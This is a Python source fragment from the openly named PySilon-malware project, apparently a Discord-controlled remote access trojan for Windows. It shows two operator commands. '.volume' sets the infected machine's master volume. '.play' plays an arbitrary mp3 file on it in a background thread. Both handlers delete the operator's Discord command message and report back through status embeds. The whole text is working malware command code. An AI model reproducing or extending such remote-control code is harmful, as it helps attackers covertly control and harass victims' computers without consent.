from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
import threading
# end of imports

# on message
elif message.content[:7] == '.volume':
    #.log Message is "volume"
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.volume':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        volume_int = message.content[8:]
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume_int = int(volume_int)
        volume_int = volume_int / 100
        if volume_int <= 1 and volume_int >= 0:
            volume.SetMasterVolumeLevelScalar(volume_int, None)
            embed = discord.Embed(title="🟢 Success",description=f'```Successfully set volume to {volume_int * 100}%```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        else:
            embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')

elif message.content[:5] == '.play':
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.play':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    elif not message.content.endswith('.mp3'):
        embed = discord.Embed(title="📛 Error",description='```Not a valid file type.```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        def play_audio():
            audio_file = message.content[6:]
            audio_file = audio_file.replace('\\','/')
            pygame.mixer.init()
            pygame.mixer.music.load(audio_file)
            pygame.mixer.music.play()

            while pygame.mixer.music.get_busy():
                pass

            pygame.mixer.quit()

        threading.Thread(target=play_audio).start()
